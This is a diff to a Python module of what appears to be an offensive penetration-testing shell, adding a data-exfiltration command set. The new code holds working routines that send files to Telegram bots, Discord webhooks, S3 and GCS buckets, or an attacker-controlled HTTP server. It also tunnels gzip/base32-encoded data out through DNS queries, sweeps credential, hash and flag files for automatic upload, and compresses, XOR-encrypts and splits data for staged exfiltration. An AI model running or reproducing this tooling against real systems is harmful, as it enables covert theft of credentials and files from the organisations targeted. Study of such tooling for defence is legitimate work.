@@ -1,25 +1,29 @@
 """Data Exfiltration command set.
 
-Pending phase module covering data-out operations: XOR file
-encrypt/decrypt, Evil-WinRM authentication, Active Directory dumpers
-(secretsdump, GetUserSPNs, GetADUsers, gMSADumper, dploot, samdump2,
-reg.py, getnthash.py, adgetpass), Git tree dumping, rsync deployment,
-infinitestorage video evidence, Gofile uploads, in-zip extraction, and
+Covers data-out operations: XOR file encrypt/decrypt, Evil-WinRM
+authentication, Active Directory dumpers (secretsdump, GetUserSPNs,
+GetADUsers, gMSADumper, dploot, samdump2, reg.py, getnthash.py,
+adgetpass), Git tree dumping, rsync deployment, infinitestorage video
+evidence, Gofile uploads, cloud exfiltration (S3, GCS, Telegram,
+Discord), DNS/ICMP covert channels, staged multi-channel exfil, and
 the C2 implant download helpers.
-
-Pending status: this set inherits from
-:class:`cli.commands._dormancy.PendingCommandSet`, so it is discovered for
-test coverage but not registered onto the shell while ``LazyOwnShell``
-still defines the original methods. Promote it to
-:class:`cli.commands._base.LazyOwnCommandSet` once the legacy copies are
-deleted from ``lazyown.py``.
 """
 
 from __future__ import annotations
 
+import base64
+import gzip
+import hashlib
+import io
+import json
 import os
 import shlex
+import shutil
 import subprocess
+import tempfile
+import time
+import zipfile
+from pathlib import Path
 
 import cmd2
 import requests
@@ -52,6 +56,14 @@ SAMDUMP2_INSTALL_COMMAND = "apt-get install samdump2 -y"
 GIT_DUMPER_INSTALL_COMMAND = "pip3 install git-dumper"
 GOFILE_UPLOAD_URL = "https://store1.gofile.io/contents/uploadfile"
 GOFILE_OK_STATUS = "ok"
+
+TELEGRAM_API_URL = "https://api.telegram.org/bot{token}/sendDocument"
+TELEGRAM_MAX_SIZE = 50 * 1024 * 1024
+DISCORD_MAX_SIZE = 25 * 1024 * 1024
+EXFIL_CHUNK_SIZE = 24 * 1024 * 1024
+DNS_CHUNK_SIZE = 40
+ICMP_CHUNK_SIZE = 48
+STAGE_COMPRESS_LEVEL = 9
 PKINIT_REPOSITORY_URL = "https://github.com/dirkjanm/PKINITtools.git"
 PKINIT_RELATIVE_PATH = os.path.join("external", ".exploit", "PKINITtools")
 PKINIT_DEPS_INSTALL_COMMAND = "pip3 install impacket minikerberos"
@@ -154,6 +166,155 @@ def _read_first_credential(credentials_file: str) -> tuple[str, str] | None:
         return None
     username, password = first_line.split(":", 1)
     return username, password
+
+
+def _extract_flag(args: list[str], flag: str) -> str | None:
+    """Extract a ``--flag <value>`` pair from a list of arguments.
+
+    Args:
+        args: Token list from ``shlex.split(line)``.
+        flag: The flag name including leading dashes.
+
+    Returns:
+        The flag value or ``None`` if the flag is not present.
+    """
+    try:
+        idx = args.index(flag)
+        return args[idx + 1]
+    except (ValueError, IndexError):
+        return None
+
+
+def _split_file(file_path: str, output_dir: str, chunk_size: int) -> None:
+    """Split a file into fixed-size chunks in ``output_dir``.
+
+    Args:
+        file_path: Source file path.
+        output_dir: Directory to write chunk files.
+        chunk_size: Maximum bytes per chunk.
+    """
+    base_name = os.path.basename(file_path)
+    with open(file_path, "rb") as src:
+        idx = 0
+        while True:
+            chunk = src.read(chunk_size)
+            if not chunk:
+                break
+            chunk_path = os.path.join(output_dir, f"{base_name}.part{idx:04d}")
+            with open(chunk_path, "wb") as dst:
+                dst.write(chunk)
+            idx += 1
+
+
+def _send_telegram_file(file_path: str, bot_token: str, chat_id: str, caption: str) -> None:
+    """Send a file to a Telegram chat via the Bot API.
+
+    Args:
+        file_path: Local file to send.
+        bot_token: Telegram Bot API token.
+        chat_id: Target chat ID.
+        caption: File caption text.
+    """
+    url = TELEGRAM_API_URL.format(token=bot_token)
+    with open(file_path, "rb") as f:
+        resp = requests.post(
+            url,
+            data={"chat_id": chat_id, "caption": caption},
+            files={"document": (os.path.basename(file_path), f)},
+            timeout=120,
+        )
+    if resp.status_code == 200 and resp.json().get("ok"):
+        print_msg(f"Sent {os.path.basename(file_path)} via Telegram")
+    else:
+        print_error(f"Telegram send failed: {resp.status_code} {resp.text[:200]}")
+
+
+def _send_discord_file(file_path: str, webhook_url: str, filename: str) -> None:
+    """Send a file to a Discord channel via webhook.
+
+    Args:
+        file_path: Local file to send.
+        webhook_url: Discord webhook URL.
+        filename: Display name for the attachment.
+    """
+    with open(file_path, "rb") as f:
+        resp = requests.post(
+            webhook_url,
+            files={"file": (filename, f)},
+            timeout=60,
+        )
+    if resp.status_code in (200, 204):
+        print_msg(f"Sent {filename} via Discord")
+    else:
+        print_error(f"Discord send failed: {resp.status_code} {resp.text[:200]}")
+
+
+def _upload_s3_presigned(
+    file_path: str,
+    bucket: str,
+    object_key: str,
+    access_key: str,
+    secret_key: str,
+    region: str,
+) -> None:
+    """Upload a file to S3 using a manually-signed presigned URL.
+
+    Args:
+        file_path: Local file to upload.
+        bucket: S3 bucket name.
+        object_key: S3 object key.
+        access_key: AWS access key.
+        secret_key: AWS secret key.
+        region: AWS region name.
+    """
+    import hashlib as _hashlib
+    import hmac
+    from datetime import datetime, timezone
+
+    with open(file_path, "rb") as f:
+        data = f.read()
+
+    amz_date = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
+    date_stamp = datetime.now(timezone.utc).strftime("%Y%m%d")
+    service = "s3"
+    algorithm = "AWS4-HMAC-SHA256"
+    content_type = "application/octet-stream"
+    payload_hash = _hashlib.sha256(data).hexdigest()
+
+    canonical_uri = "/" + object_key
+    canonical_querystring = ""
+    canonical_headers = f"content-type:{content_type}\nhost:{bucket}.s3.{region}.amazonaws.com\nx-amz-content-sha256:{payload_hash}\nx-amz-date:{amz_date}\n"
+    signed_headers = "content-type;host;x-amz-content-sha256;x-amz-date"
+    canonical_request = f"PUT\n{canonical_uri}\n{canonical_querystring}\n{canonical_headers}\n{signed_headers}\n{payload_hash}"
+
+    credential_scope = f"{date_stamp}/{region}/{service}/aws4_request"
+    string_to_sign = f"{algorithm}\n{amz_date}\n{credential_scope}\n{_hashlib.sha256(canonical_request.encode()).hexdigest()}"
+
+    def _sign(key, msg):
+        return hmac.new(key, msg.encode(), _hashlib.sha256).digest()
+
+    signing_key = _sign(_sign(_sign(_sign(("AWS4" + secret_key).encode(), date_stamp), region), service), "aws4_request")
+    signature = hmac.new(signing_key, string_to_sign.encode(), _hashlib.sha256).hexdigest()
+
+    auth_header = f"{algorithm} Credential={access_key}/{credential_scope}, SignedHeaders={signed_headers}, Signature={signature}"
+    url = f"https://{bucket}.s3.{region}.amazonaws.com/{object_key}"
+
+    resp = requests.put(
+        url,
+        data=data,
+        headers={
+            "Content-Type": content_type,
+            "Host": f"{bucket}.s3.{region}.amazonaws.com",
+            "x-amz-content-sha256": payload_hash,
+            "x-amz-date": amz_date,
+            "Authorization": auth_header,
+        },
+        timeout=120,
+    )
+    if resp.status_code in (200, 201):
+        print_msg(f"Uploaded {file_path} to s3://{bucket}/{object_key}")
+    else:
+        print_error(f"S3 presigned upload failed: HTTP {resp.status_code}")
 
 
 class ExfiltrationCommandSet(LazyOwnCommandSet):
@@ -1004,6 +1165,447 @@ class ExfiltrationCommandSet(LazyOwnCommandSet):
             print_error("Need pass the remote path to file to use this command example: download_c2 /root/root.txt")
             return
         self.download_file_from_c2(line)
+
+    @cmd2.with_category(exfiltration_category)
+    def do_exfil_s3(self, line):
+        """Upload a file to an AWS S3 bucket.
+
+        Usage: exfil_s3 <file_path> --bucket <name> --key <access_key> --secret <secret_key> [--region <region>] [--prefix <prefix>]
+
+        Requires boto3 to be installed. Falls back to a presigned-URL
+        approach using requests when boto3 is not available.
+        """
+        args = shlex.split(line)
+        if len(args) < 1:
+            print_error("Usage: exfil_s3 <file_path> --bucket <name> --key <access_key> --secret <secret_key> [--region <region>]")
+            return
+
+        file_path = args[0]
+        bucket = _extract_flag(args, "--bucket")
+        access_key = _extract_flag(args, "--key")
+        secret_key = _extract_flag(args, "--secret")
+        region = _extract_flag(args, "--region") or "us-east-1"
+        prefix = _extract_flag(args, "--prefix") or ""
+
+        if not all([bucket, access_key, secret_key]):
+            print_error("Missing required flags: --bucket, --key, --secret")
+            return
+
+        if not os.path.exists(file_path):
+            print_error(f"File not found: {file_path}")
+            return
+
+        object_key = prefix + os.path.basename(file_path)
+
+        try:
+            import boto3
+            s3 = boto3.client("s3", aws_access_key_id=access_key, aws_secret_access_key=secret_key, region_name=region)
+            s3.upload_file(file_path, bucket, object_key)
+            print_msg(f"Uploaded {file_path} to s3://{bucket}/{object_key}")
+        except ImportError:
+            print_warn("boto3 not installed, using presigned URL approach")
+            try:
+                from botocore.signers import RequestSigner
+                from botocore.auth import S3SigV4Auth
+                from botocore.awsrequest import AWSRequest
+                import datetime
+                _upload_s3_presigned(file_path, bucket, object_key, access_key, secret_key, region)
+            except ImportError:
+                print_error("boto3 required for S3 exfiltration. Install: pip install boto3")
+        except Exception as e:
+            print_error(f"S3 upload failed: {e}")
+
+    @cmd2.with_category(exfiltration_category)
+    def do_exfil_telegram(self, line):
+        """Exfiltrate a file via Telegram Bot API.
+
+        Usage: exfil_telegram <file_path> --token <bot_token> --chat <chat_id>
+
+        The file is sent as a document to the specified Telegram chat.
+        Files larger than 50MB are automatically split into chunks.
+        """
+        args = shlex.split(line)
+        if len(args) < 1:
+            print_error("Usage: exfil_telegram <file_path> --token <bot_token> --chat <chat_id> [--caption <text>]")
+            return
+
+        file_path = args[0]
+        bot_token = _extract_flag(args, "--token")
+        chat_id = _extract_flag(args, "--chat")
+        caption = _extract_flag(args, "--caption") or os.path.basename(file_path)
+
+        if not all([bot_token, chat_id]):
+            print_error("Missing required flags: --token, --chat")
+            return
+
+        if not os.path.exists(file_path):
+            print_error(f"File not found: {file_path}")
+            return
+
+        file_size = os.path.getsize(file_path)
+        if file_size <= TELEGRAM_MAX_SIZE:
+            _send_telegram_file(file_path, bot_token, chat_id, caption)
+        else:
+            print_msg(f"File exceeds 50MB, splitting into chunks...")
+            chunk_dir = tempfile.mkdtemp(prefix="lazyexfil_")
+            try:
+                _split_file(file_path, chunk_dir, TELEGRAM_MAX_SIZE)
+                chunks = sorted(os.listdir(chunk_dir))
+                for idx, chunk_name in enumerate(chunks):
+                    chunk_path = os.path.join(chunk_dir, chunk_name)
+                    chunk_caption = f"{caption} [{idx+1}/{len(chunks)}]"
+                    _send_telegram_file(chunk_path, bot_token, chat_id, chunk_caption)
+                    time.sleep(1)
+                print_msg(f"Sent {len(chunks)} chunks via Telegram")
+            finally:
+                shutil.rmtree(chunk_dir, ignore_errors=True)
+
+    @cmd2.with_category(exfiltration_category)
+    def do_exfil_discord(self, line):
+        """Exfiltrate a file via Discord webhook.
+
+        Usage: exfil_discord <file_path> --webhook <webhook_url>
+
+        Files larger than 25MB are automatically split into chunks.
+        """
+        args = shlex.split(line)
+        if len(args) < 1:
+            print_error("Usage: exfil_discord <file_path> --webhook <webhook_url> [--name <filename>]")
+            return
+
+        file_path = args[0]
+        webhook_url = _extract_flag(args, "--webhook")
+        custom_name = _extract_flag(args, "--name") or os.path.basename(file_path)
+
+        if not webhook_url:
+            print_error("Missing required flag: --webhook")
+            return
+
+        if not os.path.exists(file_path):
+            print_error(f"File not found: {file_path}")
+            return
+
+        file_size = os.path.getsize(file_path)
+        if file_size <= DISCORD_MAX_SIZE:
+            _send_discord_file(file_path, webhook_url, custom_name)
+        else:
+            print_msg(f"File exceeds 25MB, splitting into chunks...")
+            chunk_dir = tempfile.mkdtemp(prefix="lazyexfil_")
+            try:
+                _split_file(file_path, chunk_dir, DISCORD_MAX_SIZE)
+                chunks = sorted(os.listdir(chunk_dir))
+                for idx, chunk_name in enumerate(chunks):
+                    chunk_path = os.path.join(chunk_dir, chunk_name)
+                    chunk_label = f"{custom_name}.part{idx+1:03d}"
+                    _send_discord_file(chunk_path, webhook_url, chunk_label)
+                    time.sleep(1)
+                print_msg(f"Sent {len(chunks)} chunks via Discord")
+            finally:
+                shutil.rmtree(chunk_dir, ignore_errors=True)
+
+    @cmd2.with_category(exfiltration_category)
+    def do_exfil_gcs(self, line):
+        """Upload a file to Google Cloud Storage.
+
+        Usage: exfil_gcs <file_path> --bucket <name> --key <access_key_json_path>
+
+        The --key flag expects the path to a GCP service account JSON file.
+        """
+        args = shlex.split(line)
+        if len(args) < 1:
+            print_error("Usage: exfil_gcs <file_path> --bucket <name> --key <json_key_path> [--prefix <path>]")
+            return
+
+        file_path = args[0]
+        bucket = _extract_flag(args, "--bucket")
+        key_path = _extract_flag(args, "--key")
+        prefix = _extract_flag(args, "--prefix") or ""
+
+        if not all([bucket, key_path]):
+            print_error("Missing required flags: --bucket, --key")
+            return
+
+        if not os.path.exists(file_path):
+            print_error(f"File not found: {file_path}")
+            return
+
+        if not os.path.exists(key_path):
+            print_error(f"Service account key not found: {key_path}")
+            return
+
+        try:
+            from google.cloud import storage
+            client = storage.Client.from_service_account_json(key_path)
+            blob = client.bucket(bucket).blob(prefix + os.path.basename(file_path))
+            blob.upload_from_filename(file_path)
+            print_msg(f"Uploaded {file_path} to gs://{bucket}/{blob.name}")
+        except ImportError:
+            print_error("google-cloud-storage required. Install: pip install google-cloud-storage")
+        except Exception as e:
+            print_error(f"GCS upload failed: {e}")
+
+    @cmd2.with_category(exfiltration_category)
+    def do_exfil_dns(self, line):
+        """Exfiltrate data via DNS tunneling.
+
+        Usage: exfil_dns <file_path> --domain <dns_domain> [--server <dns_server>]
+
+        Encodes file content as Base32 hex and sends via DNS A-record queries.
+        Requires a cooperating DNS server that logs queries.
+        """
+        args = shlex.split(line)
+        if len(args) < 1:
+            print_error("Usage: exfil_dns <file_path> --domain <dns_domain> [--server <dns_server>]")
+            return
+
+        file_path = args[0]
+        domain = _extract_flag(args, "--domain")
+        dns_server = _extract_flag(args, "--server") or "8.8.8.8"
+
+        if not domain:
+            print_error("Missing required flag: --domain")
+            return
+
+        if not os.path.exists(file_path):
+            print_error(f"File not found: {file_path}")
+            return
+
+        try:
+            data = open(file_path, "rb").read()
+            file_hash = hashlib.sha256(data).hexdigest()[:8]
+            compressed = gzip.compress(data, compresslevel=9)
+            encoded = base64.b32hexencode(compressed).decode().rstrip("=").lower()
+            chunks = [encoded[i:i+DNS_CHUNK_SIZE] for i in range(0, len(encoded), DNS_CHUNK_SIZE)]
+            total = len(chunks)
+
+            import dns.resolver
+            resolver = dns.resolver.Resolver()
+            resolver.nameservers = [dns_server]
+
+            for idx, chunk in enumerate(chunks):
+                query = f"{file_hash}.{idx:04d}.{total:04d}.{chunk}.{domain}"
+                if len(query) > 253:
+                    print_warn(f"Query too long ({len(query)} chars), skipping chunk {idx}")
+                    continue
+                try:
+                    resolver.resolve(query, "A")
+                except Exception:
+                    pass  # expected - DNS server won't resolve unknown names
+                if (idx + 1) % 50 == 0:
+                    print_msg(f"  Sent {idx+1}/{total} DNS queries")
+                time.sleep(0.1)
+
+            print_msg(f"Exfiltrated {file_path} via {total} DNS queries to {domain}")
+            print_msg(f"Reassembly: hash={file_hash}, chunks={total}, encoding=base32+gzip")
+        except ImportError:
+            print_error("dnspython required. Install: pip install dnspython")
+        except Exception as e:
+            print_error(f"DNS exfil failed: {e}")
+
+    @cmd2.with_category(exfiltration_category)
+    def do_exfil_http(self, line):
+        """Exfiltrate a file via HTTP POST to a controlled server.
+
+        Usage: exfil_http <file_path> --url <upload_url> [--param <field_name>] [--chunked] [--ssl false]
+
+        Posts the file as multipart form data. With --chunked, splits and
+        sends in chunks with sequence headers for reassembly.
+        """
+        args = shlex.split(line)
+        if len(args) < 1:
+            print_error("Usage: exfil_http <file_path> --url <upload_url> [--param <field_name>] [--chunked]")
+            return
+
+        file_path = args[0]
+        upload_url = _extract_flag(args, "--url")
+        field_name = _extract_flag(args, "--param") or "file"
+        use_chunked = "--chunked" in args
+        use_ssl = _extract_flag(args, "--ssl") != "false"
+
+        if not upload_url:
+            print_error("Missing required flag: --url")
+            return
+
+        if not os.path.exists(file_path):
+            print_error(f"File not found: {file_path}")
+            return
+
+        if not upload_url.startswith("http"):
+            upload_url = f"{'https' if use_ssl else 'http'}://{upload_url}"
+
+        try:
+            if use_chunked:
+                file_size = os.path.getsize(file_path)
+                total_chunks = (file_size + EXFIL_CHUNK_SIZE - 1) // EXFIL_CHUNK_SIZE
+                file_hash = hashlib.sha256(open(file_path, "rb").read()).hexdigest()
+                file_name = os.path.basename(file_path)
+
+                with open(file_path, "rb") as f:
+                    for idx in range(total_chunks):
+                        chunk = f.read(EXFIL_CHUNK_SIZE)
+                        headers = {
+                            "X-Chunk-Index": str(idx),
+                            "X-Chunk-Total": str(total_chunks),
+                            "X-File-Name": file_name,
+                            "X-File-Hash": file_hash,
+                        }
+                        resp = requests.post(upload_url, files={field_name: (f"{file_name}.part{idx:04d}", chunk)}, headers=headers, timeout=30)
+                        if resp.status_code not in (200, 201, 204):
+                            print_error(f"Chunk {idx} failed: HTTP {resp.status_code}")
+                            return
+                        if (idx + 1) % 10 == 0:
+                            print_msg(f"  Sent chunk {idx+1}/{total_chunks}")
+
+                print_msg(f"Exfiltrated {file_path} via {total_chunks} HTTP POST chunks")
+            else:
+                with open(file_path, "rb") as f:
+                    resp = requests.post(upload_url, files={field_name: (os.path.basename(file_path), f)}, timeout=60)
+                if resp.status_code in (200, 201, 204):
+                    print_msg(f"Uploaded {file_path} to {upload_url}")
+                else:
+                    print_error(f"Upload failed: HTTP {resp.status_code}")
+        except requests.RequestException as e:
+            print_error(f"HTTP exfil failed: {e}")
+
+    @cmd2.with_category(exfiltration_category)
+    def do_exfil_auto(self, line):
+        """Auto-detect flags and sensitive files, then exfiltrate.
+
+        Usage: exfil_auto --method <telegram|discord|s3|gcs|http|gofile> [method flags...]
+
+        Scans common flag locations (root.txt, user.txt, /home/*/user.txt,
+        /root/root.txt, C:\\Users\\*\\Desktop\\*.txt) and exfiltrates them.
+        Supports all exfil_* --flags for the selected method.
+        """
+        args = shlex.split(line)
+        method = _extract_flag(args, "--method") or "gofile"
+
+        if method not in ("telegram", "discord", "s3", "gcs", "http", "gofile"):
+            print_error(f"Unknown method: {method}. Use: telegram, discord, s3, gcs, http, gofile")
+            return
+
+        flag_locations = [
+            "sessions/root.txt",
+            "sessions/user.txt",
+            "sessions/credentials.txt",
+            "sessions/credentials*.txt",
+            "sessions/hash.txt",
+            "sessions/users.txt",
+        ]
+
+        import glob as glob_mod
+        found = []
+        for pattern in flag_locations:
+            for match in glob_mod.glob(pattern):
+                if os.path.isfile(match) and match not in found:
+                    found.append(match)
+
+        if not found:
+            print_warn("No flag files found in sessions/")
+            return
+
+        print_msg(f"Found {len(found)} files to exfiltrate via {method}")
+        for file_path in found:
+            print_msg(f"  Exfiltrating: {file_path}")
+            cmd_line = f"exfil_{method} {file_path} " + " ".join(args[args.index("--method")+2:] if "--method" in args else [])
+            # Re-invoke the appropriate do_ method
+            method_map = {
+                "telegram": self.do_exfil_telegram,
+                "discord": self.do_exfil_discord,
+                "s3": self.do_exfil_s3,
+                "gcs": self.do_exfil_gcs,
+                "http": self.do_exfil_http,
+                "gofile": self.do_upload_gofile,
+            }
+            handler = method_map.get(method)
+            if handler:
+                handler_line = file_path + " " + " ".join(a for a in args if a not in ("--method", method))
+                handler(handler_line)
+
+    @cmd2.with_category(exfiltration_category)
+    def do_stage(self, line):
+        """Stage data for exfiltration: compress, encrypt, and split.
+
+        Usage: stage <file_or_directory> [--encrypt <key>] [--split <size_mb>] [--output <dir>]
+
+        Creates a staged package: gzip compress -> optional XOR encrypt -> split into chunks.
+        Outputs a manifest.json with reassembly instructions.
+        """
+        args = shlex.split(line)
+        if len(args) < 1:
+            print_error("Usage: stage <file_or_directory> [--encrypt <key>] [--split <size_mb>] [--output <dir>]")
+            return
+
+        target = args[0]
+        encrypt_key = _extract_flag(args, "--encrypt")
+        split_size_mb = int(_extract_flag(args, "--split") or "0")
+        output_dir = _extract_flag(args, "--output") or "sessions/staged"
+
+        if not os.path.exists(target):
+            print_error(f"Target not found: {target}")
+            return
+
+        os.makedirs(output_dir, exist_ok=True)
+        timestamp = int(time.time())
+
+        if os.path.isdir(target):
+            archive_path = os.path.join(output_dir, f"stage_{timestamp}.zip")
+            with zipfile.ZipFile(archive_path, "w", zipfile.ZIP_DEFLATED) as zf:
+                for root, _, files in os.walk(target):
+                    for f in files:
+                        fp = os.path.join(root, f)
+                        zf.write(fp, os.path.relpath(fp, os.path.dirname(target)))
+            data = open(archive_path, "rb").read()
+            os.remove(archive_path)
+        else:
+            data = open(target, "rb").read()
+
+        compressed = gzip.compress(data, compresslevel=STAGE_COMPRESS_LEVEL)
+        original_hash = hashlib.sha256(data).hexdigest()
+        compressed_hash = hashlib.sha256(compressed).hexdigest()
+
+        if encrypt_key:
+            compressed = xor_encrypt_decrypt(compressed, encrypt_key)
+
+        size_mb = len(compressed) / (1024 * 1024)
+        print_msg(f"Staged: {os.path.basename(target)} -> {size_mb:.1f}MB compressed")
+
+        manifest = {
+            "target": os.path.basename(target),
+            "original_size": len(data),
+            "compressed_size": len(compressed),
+            "original_hash": original_hash,
+            "compressed_hash": compressed_hash,
+            "encrypted": bool(encrypt_key),
+            "timestamp": timestamp,
+            "format": "gzip",
+        }
+
+        if split_size_mb > 0:
+            chunk_size = split_size_mb * 1024 * 1024
+            total_chunks = (len(compressed) + chunk_size - 1) // chunk_size
+            manifest["chunks"] = total_chunks
+            manifest["chunk_size"] = chunk_size
+            base_name = f"stage_{timestamp}"
+            for idx in range(total_chunks):
+                chunk = compressed[idx*chunk_size:(idx+1)*chunk_size]
+                chunk_path = os.path.join(output_dir, f"{base_name}.part{idx:04d}")
+                with open(chunk_path, "wb") as f:
+                    f.write(chunk)
+            print_msg(f"Split into {total_chunks} chunks in {output_dir}")
+        else:
+            output_path = os.path.join(output_dir, f"stage_{timestamp}.gz")
+            if encrypt_key:
+                output_path += ".enc"
+            with open(output_path, "wb") as f:
+                f.write(compressed)
+            manifest["output"] = output_path
+            print_msg(f"Saved to {output_path}")
+
+        manifest_path = os.path.join(output_dir, f"manifest_{timestamp}.json")
+        with open(manifest_path, "w") as f:
+            json.dump(manifest, f, indent=2)
+        print_msg(f"Manifest saved to {manifest_path}")
 
 
 __all__ = ["ExfiltrationCommandSet"]
